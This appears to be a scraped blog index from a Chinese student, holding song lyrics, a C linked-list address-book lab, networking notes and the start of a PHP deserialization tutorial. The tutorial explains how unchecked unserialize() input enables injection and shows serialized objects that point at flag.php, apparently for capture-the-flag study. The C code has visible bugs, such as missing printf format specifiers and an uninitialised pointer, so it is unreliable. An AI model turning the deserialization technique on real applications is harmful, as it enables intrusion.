孤独无尽漫长 背负着一个谎 他清场 他怯场 他离场 你都是暖场","categories":[{"name":"音乐分享","slug":"音乐分享","permalink":"https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"}],"tags":[],"author":"xizhi-future"},{"title":"数据结构第一次实验-简易通讯录","slug":"数据结构第一次实验 --- 通讯录","date":"2021-10-15T08:57:15.000Z","updated":"2021-10-15T09:04:53.240Z","comments":true,"path":"2021/10/15/数据结构第一次实验 --- 通讯录/","link":"","permalink":"https://xizhi-future.github.io/2021/10/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C%20---%20%E9%80%9A%E8%AE%AF%E5%BD%95/","excerpt":"","text":"数据结构第一次实验 — 简易通讯录123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;typedef struct phone&#123; char ID[15]; //编号 char name[20]; //姓名 char sex[5]; //性别 char tele[20];//电话 char add[30]; //住址 char group[20];//分组&#125;Person;typedef struct List&#123; Person data; struct List *next;&#125;List;List *L = NULL;//一、初始化通讯录void Init_List()&#123; L = (List*)malloc(sizeof(List)); L-&gt;next = NULL; printf(&quot;初始化通讯录成功！\\n&quot;);&#125;//二、创建 通讯录（前插法）void Creat_List_front()&#123; List *node; int count = 0; // 插入 记录 计数 int flag = 1; //作为是否继续录入的标志 while(flag)&#123; count++; node = (List*)malloc(sizeof(List)); printf(&quot;录入第%d条记录：\\n&quot;,count); printf(&quot;ID（编号）：&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.ID)); //判断 ID 是否重复 List *p = L-&gt;next; //由于是前插，则将 当前插入的 ID 与 链表中后一位进行比较 while(p)&#123; if(strcmp(p-&gt;data.ID,node-&gt;data.ID) == 0)&#123; printf(&quot;ID重复，请重新进行输入！\\n&quot;); printf(&quot;ID（编号）：&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.ID)); &#125;else p = p-&gt;next; //遍历所有元素进行比较 &#125; printf(&quot;姓名：&quot;); scanf(&quot;%s&quot;,(node-&gt;data.name)); printf(&quot;性别（女：F 男：M）：&quot;); scanf(&quot;%s&quot;,(node-&gt;data.sex)); printf(&quot;电话（11位）：&quot;); scanf(&quot;%s&quot;,(node-&gt;data.tele)); printf(&quot;住址：&quot;); scanf(&quot;%s&quot;,(node-&gt;data.add)); printf(&quot;分组（朋友、家人、同学等）：&quot;); scanf(&quot;%s&quot;,(node-&gt;data.group)); //前插 node-&gt;next = L-&gt;next; L-&gt;next = node; printf(&quot;是否继续录入？（1.继续 0.完成录入）&quot;); scanf(&quot;%d&quot;,&amp;flag); if(flag==0) break; &#125;&#125;//三、创建 通讯录（尾插法）void Creat_List_behind()&#123; List *node,*tail; tail = L; int count = 0; int flag = 1; while(flag)&#123; count++; node = (List*)malloc(sizeof(List)); printf(&quot;录入第%d条记录：\\n&quot;,count); printf(&quot;ID（编号）：&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.ID)); //判断 ID 是否重复 List *p = L-&gt;next; //由于是前插，则将 当前插入的 ID 与 链表中后一位进行比较 while(p)&#123; if(strcmp(p-&gt;data.ID,node-&gt;data.ID) == 0)&#123; printf(&quot;ID重复，请重新进行输入！\\n&quot;); printf(&quot;ID（编号）：&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.ID)); &#125;else p = p-&gt;next; //遍历所有元素进行比较 &#125; printf(&quot;姓名：&quot;); scanf(&quot;%s&quot;,(node-&gt;data.name)); printf(&quot;性别（女：F 男：M）：&quot;); scanf(&quot;%s&quot;,(node-&gt;data.sex)); printf(&quot;电话（11位）：&quot;); scanf(&quot;%s&quot;,(node-&gt;data.tele)); printf(&quot;住址：&quot;); scanf(&quot;%s&quot;,(node-&gt;data.add)); printf(&quot;分组（朋友、家人、同学等）：&quot;); scanf(&quot;%s&quot;,(node-&gt;data.group)); //尾插 tail-&gt;next = node; node-&gt;next = NULL; tail = node; printf(&quot;是否继续录入？（1.继续 0.完成录入）&quot;); scanf(&quot;%d&quot;,&amp;flag); if(flag == 0) break; &#125;&#125;//四、删除记录void Dele_List()&#123; List *p = L-&gt;next; List *q = L; //使 q 始终指向 p 的前一个结点 char ID[15]; printf(&quot;请输入需要删除的ID：&quot;); scanf(&quot;%s&quot;,&amp;ID); while(p &amp;&amp; strcmp(p-&gt;data.ID,ID) != 0)&#123; //查找 需要删除的节点位置 p p = p-&gt;next; q = q-&gt;next; &#125; if(p)&#123; q-&gt;next = p-&gt;next; //删除 p 所指结点 printf(&quot;删除成功！\\n&quot;); printf(&quot;您所删除的信息是：\\n&quot;); printf(&quot;ID（编号）：&quot;,p-&gt;data.ID); printf(&quot;姓名：&quot;,p-&gt;data.name); printf(&quot;性别（女：F 男：M）：&quot;,p-&gt;data.sex); printf(&quot;电话：&quot;,p-&gt;data.tele); printf(&quot;住址：&quot;,p-&gt;data.add); printf(&quot;分组：&quot;,p-&gt;data.group); free(p); //释放空间 &#125;else&#123; printf(&quot;通讯录中不存在此人信息！\\n&quot;); &#125;&#125;//五、插入记录（前插法）void Insert_List_front()&#123; List *p,*q,*r,*node; p = p-&gt;next; q = L; char ID[15]; printf(&quot;请输入需要插入的记录 ID：&quot;); scanf(&quot;%s&quot;,&amp;ID); while(p &amp;&amp; strcmp(p-&gt;data.ID,ID) != 0)&#123; p = p-&gt;next; q = q-&gt;next; &#125; if(p != NULL)&#123; node = (List*)malloc(sizeof(List)); printf(&quot;请输入结点信息：\\n&quot;); judge: printf(&quot;ID：&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.ID)); //判断 ID 是否重复 r = L-&gt;next; while(r &amp;&amp; strcmp(r-&gt;data.ID,node-&gt;data.ID) != 0) &#123; r = r-&gt;next; &#125; if(r != NULL) //ID 重复 &#123; printf(&quot;ID重复，请重新输入！\\n&quot;); goto judge; &#125; printf(&quot;姓名：&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.name)); printf(&quot;性别：&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.sex)); printf(&quot;电话：&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.tele)); printf(&quot;住址：&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.add)); printf(&quot;分组：&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.group)); &#125; else &#123; //如果没有该ID int select1; printf(&quot;通讯录中未找到该ID,是否使用默认方式将新节点插入到最后(1.是 0.否)：&quot;); scanf(&quot;%d&quot;, &amp;select1); if (select1 == 1) &#123; //给新节点分配空间 node = (List *)malloc(sizeof(List)); //给新节点输入数据 printf(&quot;请输入新节点信息：\\n&quot;); judge1: printf(&quot;ID：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.ID)); //判断ID是否重复 r = L-&gt;next; while (r &amp;&amp; strcmp(r-&gt;data.ID, node-&gt;data.ID) != 0) &#123; r = r-&gt;next; &#125; if (r != NULL) //ID重复 &#123; printf(&quot;ID重复,请重新输入!\\n&quot;); goto judge1; &#125; printf(&quot;姓名：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.name)); printf(&quot;性别：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.sex)); printf(&quot;电话：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.tele)); printf(&quot;住址：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.add)); printf(&quot;分组：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.group)); &#125; else return; &#125; node-&gt;next = q-&gt;next; q-&gt;next = node; printf(&quot;插入成功！\\n&quot;);&#125;//六、插入记录（尾插法）void Insert_List_behind()&#123; List *p, *r, *q, *node; p = L-&gt;next; q = L; char ID[15]; printf(&quot;请输入要插入的位置(输入该位置的ID)：&quot;); scanf(&quot;%s&quot;, &amp;ID); while (p &amp;&amp; strcmp(p-&gt;data.ID,ID) != 0) &#123; p = p-&gt;next; q = q-&gt;next; &#125; if (p != NULL) &#123; //为新节点分配空间 node = (List*)malloc(sizeof(List)); //为新节点输入数据 printf(&quot;请输入新节点信息：\\n&quot;); judge: printf(&quot;ID：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.ID)); //判断ID是否重复 r = L-&gt;next; while (r &amp;&amp; strcmp(r-&gt;data.ID, node-&gt;data.ID) != 0) &#123; r = r-&gt;next; &#125; if (r != NULL) &#123; printf(&quot;ID重复，请重新输入！\\n&quot;); goto judge; &#125; printf(&quot;姓名：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.name)); printf(&quot;性别：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.sex)); printf(&quot;电话：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.tele)); printf(&quot;住址：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.add)); printf(&quot;分组：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.group)); node-&gt;next = p-&gt;next; p-&gt;next = node; printf(&quot;插入成功！\\n&quot;); &#125; else &#123; //通讯录中未找到该ID int select2; printf(&quot;通讯录中未找到该ID,是否使用默认方式将该节点插入到最后(1.是 0.否)：&quot;); scanf(&quot;%d&quot;, &amp;select2); if (select2 == 1) &#123; //为新节点分配空间 node = (List *)malloc(sizeof(List)); //为新节点录入信息 printf(&quot;请输入新节点信息：\\n&quot;); judge1: printf(&quot;ID：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.ID)); //判断ID是否重复 r = L-&gt;next; while (r &amp;&amp; strcmp(r-&gt;data.ID, node-&gt;data.ID) != 0) &#123; r = r-&gt;next; &#125; if (r != NULL) //ID重复 &#123; printf(&quot;ID重复，请重新输入！\\n&quot;); goto judge1; &#125; printf(&quot;姓名：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.name)); printf(&quot;性别：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.sex)); printf(&quot;电话：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.tele)); printf(&quot;住址：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.add)); printf(&quot;分组：&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.group)); node-&gt;next = q-&gt;next; q-&gt;next = node; &#125; if (select2 == 0) return; &#125; &#125;//七、修改通讯录记录void Update_List()&#123; List *p; p = L-&gt;next; char ID[15]; printf(&quot;请输入需要修改的ID：&quot;); scanf(&quot;%s&quot;,&amp;ID); while(p &amp;&amp; strcmp(p-&gt;data.ID,ID) != 0)&#123; p = p-&gt;next; &#125; if(p != NULL)&#123; int select; printf(&quot;请输入需要修改的属性：（1.姓名 2.性别 3.电话 4.住址 5.分组）：&quot;); scanf(&quot;%d&quot;,&amp;select); if(select == 1) &#123; printf(&quot;请输入新的姓名：&quot;); scanf(&quot;%s&quot;,&amp;(p-&gt;data.name)); &#125; if(select == 2) &#123; printf(&quot;请输入新的性别：&quot;); scanf(&quot;%s&quot;,&amp;(p-&gt;data.sex)); &#125; if(select == 3) &#123; printf(&quot;请输入新的电话：&quot;); scanf(&quot;%s&quot;,&amp;(p-&gt;data.tele)); &#125; if(select == 4) &#123; printf(&quot;请输入新的住址：&quot;); scanf(&quot;%s&quot;,&amp;(p-&gt;data.add)); &#125; if(select == 5) &#123; printf(&quot;请输入新的分组：&quot;); scanf(&quot;%s&quot;,&amp;(p-&gt;data.group)); &#125; printf(&quot;更新成功！\\n&quot;); &#125; else &#123; printf(&quot;通讯录中不存在该 ID！\\n&quot;); return; &#125;&#125;//八、查找记录（根据ID）void Find_List()&#123; List *p; char ID[15]; p = L-&gt;next; printf(&quot;请输入需要查找的ID：&quot;); scanf(&quot;%s&quot;,&amp;ID); while(p &amp;&amp; strcmp(p-&gt;data.ID,ID) != 0) &#123; p = p-&gt;next; &#125; if(p == NULL) &#123; printf(&quot;通讯录中不存在此人！\\n&quot;); return; &#125; else &#123; printf(&quot;ID（编号）：%s\\t&quot;,p-&gt;data.ID); printf(&quot;姓名：&quot;,p-&gt;data.name); printf(&quot;性别（女：F 男：M）：%s\\t&quot;,p-&gt;data.sex); printf(&quot;电话（11位）：%s\\t&quot;,p-&gt;data.tele); printf(&quot;住址：%s\\t&quot;,p-&gt;data.add); printf(&quot;分组（朋友、家人、同学等）：%s\\t&quot;,p-&gt;data.group); &#125;&#125;//九、打印输出所有记录 遍历void Printall_List()&#123; List *p; if(L == NULL) &#123; printf(&quot;通讯录是空的！\\n&quot;); return; &#125; else &#123; p = L-&gt;next; printf(&quot;通讯录中的全部记录如下：\\n&quot;); while(p) &#123; printf(&quot;ID（编号）：%s\\t&quot;,p-&gt;data.ID); printf(&quot;姓名：&quot;,p-&gt;data.name); printf(&quot;性别（女：F 男：M）：%s\\t&quot;,p-&gt;data.sex); printf(&quot;电话（11位）：%s\\t&quot;,p-&gt;data.tele); printf(&quot;住址：%s\\t&quot;,p-&gt;data.add); printf(&quot;分组（朋友、家人、同学等）：%s\\t&quot;,p-&gt;data.group); printf(&quot;\\n&quot;); p = p-&gt;next; &#125; &#125;&#125;//十、释放 链表void Destroy_List()&#123; List *p,*q; p = L-&gt;next; while(p) &#123; q = p; //使用 q 暂时存放当前结点 p = p-&gt;next; free(q); q = NULL; &#125; free(p); free(L); L = NULL; printf(&quot;释放成功！\\n&quot;);&#125;//菜单界面void Menu()&#123; printf(&quot;\\t\\t\\t*********************简易通讯录*******************\\n&quot;); printf(&quot;\\t\\t\\t1.初始化通讯录 5.查找联系人\\n&quot;); printf(&quot;\\t\\t\\t2.创建通讯录 6.插入联系人\\n&quot;); printf(&quot;\\t\\t\\t3.删除联系人 7.遍历通讯录\\n&quot;); printf(&quot;\\t\\t\\t4.修改联系人 8.释放通讯录\\n&quot;); printf(&quot;\\t\\t\\t********************* 0 为退出 *******************\\n&quot;);&#125; int main()&#123; int select; printf(&quot;使用说明：为了您的正常使用，请按照顺序进行操作！！！\\n&quot;); printf(&quot;首先请初始化；随后请创建通讯录！！！之后可进行 删除、修改、查找、插入、遍历等操作；最后请释放通讯录！！\\n&quot;); while(1) &#123; //system(&quot;cls&quot;); Menu(); printf(&quot;请选择菜单：&quot;); scanf(&quot;%d&quot;,&amp;select); switch(select)&#123; case 1: &#123; //初始化 Init_List(); break; &#125; case 2: &#123; //创建通讯录 int num; printf(&quot;请选择创建方式(1.前插法 2.尾插法)：&quot;); scanf(&quot;%d&quot;,&amp;num); if(num == 1) &#123; //前插法 Creat_List_front(); break; &#125; if(num == 2) &#123; //尾插法 Creat_List_behind(); break; &#125; &#125; case 3: &#123; //删除记录 Dele_List(); break; &#125; case 4: &#123; //修改记录 Update_List(); break; &#125; case 5: &#123; //查找记录 Find_List(); break; &#125; case 6: &#123; //插入记录 int num; printf(&quot;请选择插入方式(1.前插法 2.尾插法)&quot;); scanf(&quot;%d&quot;,&amp;num); if(num == 1) &#123; //前插法 Insert_List_front(); break; &#125; if(num == 2) &#123; //尾插法 Insert_List_behind(); break; &#125; &#125; case 7: &#123; //遍历 Printall_List(); break; &#125; case 8: &#123; //释放 Destroy_List(); break; &#125; case 0: &#123; return 0; &#125; default: break; &#125; system(&quot;pause&quot;); system(&quot;cls&quot;); &#125;&#125;","categories":[{"name":"数据结构","slug":"数据结构","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[],"author":"xizhi-future"},{"title":"呓语","slug":"呓语","date":"2021-10-10T08:46:24.000Z","updated":"2021-10-10T09:07:35.393Z","comments":true,"path":"2021/10/10/呓语/","link":"","permalink":"https://xizhi-future.github.io/2021/10/10/%E5%91%93%E8%AF%AD/","excerpt":"","text":"作词 : 毛不易 作曲 : 毛不易 一段未醒 又做一段 如果这画面有开关 从期待走到不堪 结局不好看 人总需要记住遗憾 它来过 它走了 没回头 没问过 你可舍得 日月蹉跎 小起大落 光阴里有多少景色 偶尔也心口一热 什么都不说 好过亲手把它撕破 路还长 梦还多 被这话 欺骗的 何止你我 可是我现在依然不太会转弯 虽然孤单的人偶尔也想有个伴 冷风又吹的时候想说 这生活会不会有点难 难道是因为当初有话没讲完 堵在喉咙里却始终不敢大声喊 算了 别哭 日月蹉跎 小起大落 光阴里有多少景色 偶尔也心口一热 什么都不说 好过亲手把它撕破 路还长 梦还多（不多） 被这话 欺骗的 何止你我 可是我现在依然不太会转弯 虽然孤单的人偶尔也想有个伴 冷风又吹的时候想说 这生活会不会有点难 难道是因为当初有话没讲完 堵在喉咙里却始终不敢大声喊 算了 别哭 可是我偏偏就是不想要转弯 就算不开灯的房间真的有些暗 夜色又来的时候想说 为什么只留给我一半 难道是因为出现的人都伪善 擅长告别擅长躲闪擅长分两端 算了 别哭","categories":[{"name":"音乐分享","slug":"音乐分享","permalink":"https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"}],"tags":[],"author":"xizhi-future"},{"title":"保留","slug":"保留","date":"2021-10-10T08:44:00.000Z","updated":"2021-10-10T08:45:51.039Z","comments":true,"path":"2021/10/10/保留/","link":"","permalink":"https://xizhi-future.github.io/2021/10/10/%E4%BF%9D%E7%95%99/","excerpt":"","text":"作词 : 郭顶 作曲 : 郭顶 看见 你在我眼前 不去猜想我们隔多远 当我 夜幕中准备 只想让沉默的能开解 在不同的遭遇里我发现你的瞬间 有种不可言说的温柔直觉 在有限的深夜消失之前触摸你的脸 我情愿这是幻觉 也不愿是种告别 已经忘了 你的名字 就在这座 寂静星石 怎么还有 你的样子 被保留 给我 一整个拥抱 好让我不至于 太潦倒 时间 过一分一秒 还是觉得相遇 太美好 在不同的遭遇里我发现你的瞬间 有种不可言说的温柔直觉 当不远的蓝色渐渐显现这无边境界 我始终等待再见 只不愿再也不见 已经忘了 你的名字 就在这座 寂静星石 怎么还有 你的样子 想形容你的句子 关于你所有心事 一眼能及的钻石 哪一个是你地址 忘了 你的名字 就在这座 寂静星石 怎么还有 你的样子 我始终等待再见 只不愿再也不见 真的忘了 你的名字 是在哪座 寂静星石 一直还有 你的样子 被保留","categories":[{"name":"音乐分享","slug":"音乐分享","permalink":"https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"}],"tags":[],"author":"xizhi-future"},{"title":"虚拟机的网络设置","slug":"虚拟机的网络设置","date":"2021-10-08T13:12:52.000Z","updated":"2021-10-08T13:13:15.379Z","comments":true,"path":"2021/10/08/虚拟机的网络设置/","link":"","permalink":"https://xizhi-future.github.io/2021/10/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/","excerpt":"","text":"虚拟机的网络设置VMware三种网络设置：Bridged桥接，NET网络地址转换模式，Host-Only仅主机模式 当下载软件之后，我们的真实机上将会多出一些虚拟网卡，用于 虚拟机网络的配置 VMnet0 ：用于 Bridged 桥接模式 VMnet8 ：用于 NET 模式 VMnet1 ：用于 Host-Only 模式 可以看到存在 三个 VMnet0 VMnet1 VMnet8 这些是 VMware Workstation 软件 自带的，可以进行设置，可以进行删除，它们相当于 是三个交换机。 VMnet0 ：如果将一个虚拟机设置为连接在 该交换机上，则相当于 将其 当作一个 真实的物理机 一样连接在你 真实机的所处的网段 当中。 测试：设置 Windows 7 接在 VMnet0 上 我们设置为 自动获得 IP 地址，然后查看其网络连接的详细信息，可以看到与我们真实的物理机所处的网段相同。 使用 真实机 ping 192.168.4.234 实际上，只要是处于该网段中的任意一台计算机都可以 ping 通 我们所设置的 虚拟机 当中可能出现的错误：解决办法 （注意：需要使用 管理员方式运行；关闭要ping 的主机的防火墙） 当不需要与外网进行通信，也就是平时我们 仅仅搭建一个小型局域网的 测试，只需要我们的几个虚拟机之间进行通信，我们就不用使用 VMnet0 ，可以使用 其他的交换机或者是 使用 Host-Only **NET **：通过真实机 上网，存在一个地址转换，只要是真实机所能访问的所有网络，虚拟机均可 Host-Only ：仅主句模式，仅仅能与 真实机 进行通信 补充： 169.254.X.X 是Windows操作系统在DHCP信息租用失败时自动给客户机分配的IP地址。但是是无法与网关通信的，也无法接入Internet的情况。 虚拟机网络设置 参考","categories":[{"name":"计网","slug":"计网","permalink":"https://xizhi-future.github.io/categories/%E8%AE%A1%E7%BD%91/"}],"tags":[{"name":"虚拟机","slug":"虚拟机","permalink":"https://xizhi-future.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"author":"xizhi-future"},{"title":"1.7 计算机网络的体系结构","slug":"1.7-计算机网络的体系结构","date":"2021-10-08T12:01:19.000Z","updated":"2021-10-08T12:02:38.238Z","comments":true,"path":"2021/10/08/1.7-计算机网络的体系结构/","link":"","permalink":"https://xizhi-future.github.io/2021/10/08/1.7-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9A%84%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/","excerpt":"","text":"1.7 计算机网络的体系结构 ISO 国际标准化组织 OSI / RM 互连网法律上的国际标准 TCP / IP 因特网事实上的国际标准 网络协议 Network Protocols 数据交换存寿的规则、标准与约定 网络体系结构 计算机网络各层及其协议的集合 1.7.1 OSI 七层模型开放式系统互联通信参考模型（英语：Open System Interconnection Reference Model，缩写为 OSI），简称为 OSI模型（OSI model），一种 概念模型，由 国际标准化组织 提出，一个试图使各种计算机在世界范围内互连为网络的标准框架。 应用层：可以产生流量，可以与用户进行交互的应用程序 表示层：是否加密？ 是否压缩？ 编码问题？ 开发人员需要考虑的问题 会话层：服务端与客户端建立的会话 可查看木马：netstat -nb ​ 例如：远程桌面建立会话 192.168.158.1 远程连接 192.168.158.115 对 192.168.158.115 进行端口查看，可以看到 存在远程桌面的会话 netstat -an 进一步 进行 “木马” 查看： netstat -nb 例：当想查看当前计算机中是否存在木马，可以打开电脑，不进行任何操作，即无流量传输，后 命令 netstat -nb ，查看进程。 传输层：可靠传输（建立会话），不可靠传输（不建立会话），流量控制 网络层：IP地址编址，选择最佳路径（动态路由协议） 数据链路层：规定数据如何封装，添加物理层地址（MAC 地址） 物理层：电压、接口标准 应用举例： ​ 网络排错：分层检查：从最底层开始向上逐一排查 1. 网线是否插好？（物理层） 2. IP地址 检查 （网络层） 3. 浏览器 恶意插件？（应用层） 终极：重装，重启，格式化 网络安全与 OSI 参考模型 物理层安全 设置 交换机 某接口禁止 外来用户 的连接 数据链路层安全 ADSL、AP密码 网络层安全 设置 路由器 某接口 禁止外来用户 的连接 应用层安全 SQL注入、文件上传、文件包含等等 应用层漏洞、各种攻击手段等 1.7.2 TCP/IP 四层模型应用层 （包括了 表示层、会话层） 传输层 网络层 **网络接口层 ** （包括了 数据链路层、物理层） 1.7.3 五层协议 对应 数据单元 以及 数据简单 运输过程应用层 传输数据单元：PDU **传输层 ** 运输层 报文 加 TCP/UDP 网络层 IP 数据包 （IP 分组） 加 IP 地址 数据链路层 数据帧 加 MAC 地址，加帧头帧尾 物理层 比特流 bit (01构成) 1.7.4 基本概念实体 entity ：交换信息或软件进程 协议 protocol ：控制两个对等实体通信的规则 服务 service ：下层向上层提供服务，上层需要使用下层提供的服务来实现本层的功能 服务访问点 SAP ：相邻两层实体之间交换信息的地方 1.7.5 实操查看本地网络连接网速： 测试：windows 7 自动协商是根据双方速率进行自动设置，如果强制设置为与另一方速率不匹配的网速，则无法正常进行通信。","categories":[{"name":"计网","slug":"计网","permalink":"https://xizhi-future.github.io/categories/%E8%AE%A1%E7%BD%91/"}],"tags":[{"name":"计网","slug":"计网","permalink":"https://xizhi-future.github.io/tags/%E8%AE%A1%E7%BD%91/"}],"author":"xizhi-future"},{"title":"序列化与反序列化","slug":"序列化与反序列化","date":"2021-10-07T10:10:26.000Z","updated":"2021-10-07T10:11:19.031Z","comments":true,"path":"2021/10/07/序列化与反序列化/","link":"","permalink":"https://xizhi-future.github.io/2021/10/07/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"[TOC] 序列化与反序列化 序列化：持久保存，网络传输 序列化是将对象状态转换为可保持或可传输的格式的过程（对象转换为字符串）。与序列化相对的是反序列化，它将流转换为对象（字符串转换为对象）。这两个过程结合起来，可以轻松地存储和传输数据 本质上就是对于数据格式的一种转换 常见的序列化格式： 二进制格式 字节数组 json 字符串 xml 字符串 理解：在程序执行结束时，内存数据便会立即销毁，变量所储存的数据便是内存数据，而文件、数据库是“持久数据”，因此PHP序列化就是将内存的变量数据“保存”到文件中的持久数据的过程。 一、 PHP 反序列化1.1 格式原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码注入，SQL注入等危害。 当进行反序列化的过程中就会自动触发某些魔术方法。 涉及函数： 12serialize() //序列化：将一个对象转换为一个字符串unserialize() //反序列化：将一个字符串还原为一个对象 示例： 12345678910111213141516&lt;?php$test = &quot;qww&quot;;//$test = 123;//$test = true;$test = serialize($test);echo $test;?&gt;//s:3:&quot;qww&quot;;//i:123; //b:1;&lt;?php$test = &#x27;s:3:&quot;qww&quot;;&#x27;;$test = unserialize($test);echo $test;?&gt;//qww 1234567&lt;?php$user=array(&#x27;xiao&#x27;,&#x27;shi&#x27;,&#x27;zi&#x27;);$user=serialize($user);echo $user;echo &quot;&lt;br /&gt;&quot;;print_r(unserialize($user));?&gt; 格式： 序列化与反序列化 字母表示： a array数组 b boolean判断类型 d double浮点数 i integer整数型 o common object 一般的对象 r reference引用类型 s string字符串类型 C custom object O class N null R pointer reference U unicode string 1.2 特性 所有 php 中的值都可以使用 serialize() 来返回一个包含字节流的字符串表示 序列化之后的内容只有成员变量，没有成员函数，即方法 12345678910&lt;?phpclass test&#123; public $a; public $b; function __construct()&#123;$this-&gt;a = &quot;xiaoshizi&quot;;$this-&gt;b=&quot;laoshizi&quot;;&#125; function happy()&#123;return $this-&gt;a;&#125;&#125;$a = new test();echo serialize($a);?&gt; 三种变量类型的差异： 变量前是 protected，则会在变量名前加上\\x00*\\x00 , private 则会在变量名前加上\\x00类名\\x00，\\x00字段名\\x00，输出时一般需要url编码，若在本地存储推荐采用base64编码的形式。 public 正常输出 Private 所声明的私有变量 只能在所声明的类中可见，在该类的子类以及该类的对象中均不可见。所以私有变量在序列化时，类名和字段名前面都会加上 %00 ，即 ascii 为0的字符（不可见字符）； Protected 所声明受保护类型的变量 序列化时会有 %00*%00 字符； 测试一：public 12345678910&lt;?phpclass FileHandler &#123; public $op=&#x27;2&#x27;; public $filename=&#x27;flag.php&#x27;; public $content;&#125;$flag = new FileHandler();$flag_1 = (serialize($flag));echo $flag_1;?&gt; 12#返回O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:1:&quot;2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125; 测试二：private 12345678910&lt;?phpclass FileHandler &#123; private $op=&#x27;2&#x27;; private $filename=&#x27;flag.php&#x27;; private $content;&#125;$flag = new FileHandler();$flag_1 = (serialize($flag));echo $flag_1;?&gt; 12#返回O:11:&quot;FileHandler&quot;:3:&#123;s:15:&quot;FileHandlerop&quot;;s:1:&quot;2&quot;;s:21:&quot;FileHandlerfilename&quot;;s:8:&quot;flag.php&quot;;s:20:&quot;FileHandlercontent&quot;;N;&#125; 12#实际上是O:11:&quot;FileHandler&quot;:3:&#123;s:15:&quot;%00FileHandler%00op&quot;;s:1:&quot;2&quot;;s:21:&quot;%00FileHandler%00filename&quot;;s:8:&quot;flag.php&quot;;s:20:&quot;%00FileHandler%00content&quot;;N;&#125; 测试三：protected 12345678910&lt;?phpclass FileHandler &#123; protected $op=&#x27;2&#x27;; protected $filename=&#x27;flag.php&#x27;; protected $content;&#125;$flag = new FileHandler();$flag_1 = (serialize($flag));echo $flag_1;?&gt; 12#返回O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;s:1:&quot;2&quot;;s:11:&quot;*filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;*content&quot;;N;&#125; 实际上是输出导致了不可见字符 \\x00 的丢失 12#实际上是O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;%00*%00op&quot;;s:1:&quot;2&quot;;s:11:&quot;%00*%00filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;%00*%00content&quot;;N;&#125; 1.3 php 反序列化的触发触发条件： unserialize() 函数 的变量可控，文件当中存在可利用的类，类中存在魔术方法 常见魔术方法：魔术方法就是 php 在进行有关类中变量序列化以及反序列化相关操作是会自动被调用的一些方法（函数） 123456789101112__wakeup() //使用unserialize时触发 __sleep() //使用serialize时触发 __destruct() //对象被销毁时触发__call() 